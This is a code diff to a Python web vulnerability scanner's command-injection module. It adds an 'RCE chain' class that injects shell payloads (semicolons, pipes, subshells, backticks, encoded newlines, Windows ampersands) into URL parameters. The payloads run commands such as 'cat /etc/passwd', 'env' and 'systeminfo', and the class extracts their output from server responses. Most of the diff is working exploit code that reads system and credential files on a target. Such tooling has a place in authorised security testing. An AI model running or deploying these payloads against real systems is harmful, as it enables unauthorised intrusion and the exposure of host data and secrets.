@@ -17,7 +17,7 @@ from __future__ import annotations
 import logging
 import re
 import time
-from typing import Any, Dict, List, Optional, Tuple
+from typing import Any, Callable, Dict, List, Optional, Tuple
 from urllib.parse import parse_qsl, urlparse, urlencode, urlunparse
 
 import requests as _requests
@@ -98,6 +98,42 @@ class CmdiScanner(BaseScanner):
         urls = kwargs.get("urls") or [target]
         for url in urls:
             self.scan_url(url)
+
+        # ─── Adım 5: RCE chain — komut çıktısını raporla ─────────────────
+        self._run_rce_chain(urls)
+
+    def _run_rce_chain(self, urls: List[str]) -> None:
+        """
+        Confirms CMDI findings with CMDIRCEChain — extracts real command output.
+        Runs only on URLs that already produced a CMDI finding (optimization).
+        """
+        rce = CMDIRCEChain()
+        confirmed_urls = {
+            f.get("url", "")
+            for f in (self.results or {}).get("offensive", [])
+            if "Command Injection" in f.get("vuln_type", "")
+        }
+        for url in urls[:5]:
+            if url not in confirmed_urls:
+                continue
+            parsed = urlparse(url)
+            params = [p for p, _ in parse_qsl(parsed.query)]
+            for param in params[:3]:
+                result = rce.extract(url, param, self.session)
+                if result:
+                    self.report_finding(
+                        vuln_type="OS Command Injection — RCE Confirmed (Output Extracted)",
+                        url=url,
+                        param=param,
+                        payload=result["payload"],
+                        severity="Critical",
+                        evidence=(
+                            f"Command '{result['command']}' output: "
+                            f"{result['output_snippet'][:300]}"
+                        ),
+                        rce_confirmed=True,
+                        command=result["command"],
+                    )
 
     def scan_url(self, url: str) -> bool:
         """
@@ -394,5 +430,97 @@ def run(
 ) -> None:
     scanner = CmdiScanner(session=session, results=results, debug=debug)
     targets = urls or [url]
-    for target in targets:
-        scanner.scan_url(target)
+    scanner.run(targets[0], urls=targets)
+
+
+# ===========================================================================
+# Adım 5 — CMDI → RCE Automation Chain
+# ===========================================================================
+
+class CMDIRCEChain:
+    """
+    Post-injection RCE chain: after CMDI is confirmed, extracts actual
+    command output to prove exploitability beyond timing-based guesses.
+    Single Responsibility: command output extraction only.
+    Open/Closed: extend _UNIX_CMDS/_WIN_CMDS for new targets.
+    """
+
+    _INJECT_FMTS: List[Tuple[str, str]] = [
+        ("; {cmd}",           "unix_semicolon"),
+        ("| {cmd}",           "unix_pipe"),
+        ("$({cmd})",          "unix_subshell"),
+        ("`{cmd}`",           "unix_backtick"),
+        ("%0a{cmd}",          "unix_newline"),
+        ("%0d%0a{cmd}",       "unix_crlf_newline"),
+        ("& {cmd}",           "win_amp"),
+        ("| {cmd}",           "win_pipe"),
+        ("&& {cmd}",          "win_ampamp"),
+    ]
+
+    _UNIX_CMDS: List[str] = [
+        "id",
+        "whoami",
+        "uname -a",
+        "cat /etc/passwd",
+        "env",
+        "hostname",
+        "ip a 2>/dev/null || ifconfig",
+    ]
+
+    _WIN_CMDS: List[str] = [
+        "whoami",
+        "systeminfo",
+        "ipconfig",
+        "type C:\\Windows\\win.ini",
+        "echo %USERNAME%",
+    ]
+
+    _OUTPUT_RE = re.compile(
+        r"(?:uid=\d+\("
+        r"|root:.*:0:0:"
+        r"|Linux \S+"
+        r"|Microsoft Windows"
+        r"|\[extensions\]"          # win.ini
+        r"|PROCESSOR_ARCHITECTURE"  # systeminfo
+        r"|inet \d+\.\d+"           # ip a / ifconfig
+        r"|www-data|apache|nginx"   # common web users
+        r"|IP Address.*\d+\.\d+)",  # ipconfig
+        re.I | re.S,
+    )
+
+    def extract(
+        self,
+        url: str,
+        param: str,
+        session: Any,
+        baseline_text: str = "",
+        timeout: int = 12,
+    ) -> Optional[Dict[str, Any]]:
+        """
+        Try all inject formats × commands, return first result with real output.
+        Returns None if no output can be extracted.
+        """
+        parsed = urlparse(url)
+        qs = parse_qsl(parsed.query)
+
+        for fmt, technique in self._INJECT_FMTS:
+            for cmd in self._UNIX_CMDS + self._WIN_CMDS:
+                payload = fmt.format(cmd=cmd)
+                new_qs = [(p, v + payload if p == param else v) for p, v in qs]
+                t_url = urlunparse(parsed._replace(query=urlencode(new_qs)))
+                try:
+                    resp = session.get(t_url, timeout=timeout)
+                    text = resp.text or ""
+                    m = self._OUTPUT_RE.search(text)
+                    if m and m.group(0) not in baseline_text:
+                        start = max(0, m.start() - 30)
+                        end = min(len(text), m.end() + 250)
+                        return {
+                            "command": cmd,
+                            "technique": technique,
+                            "payload": payload,
+                            "output_snippet": text[start:end].strip(),
+                        }
+                except Exception:
+                    continue
+        return None
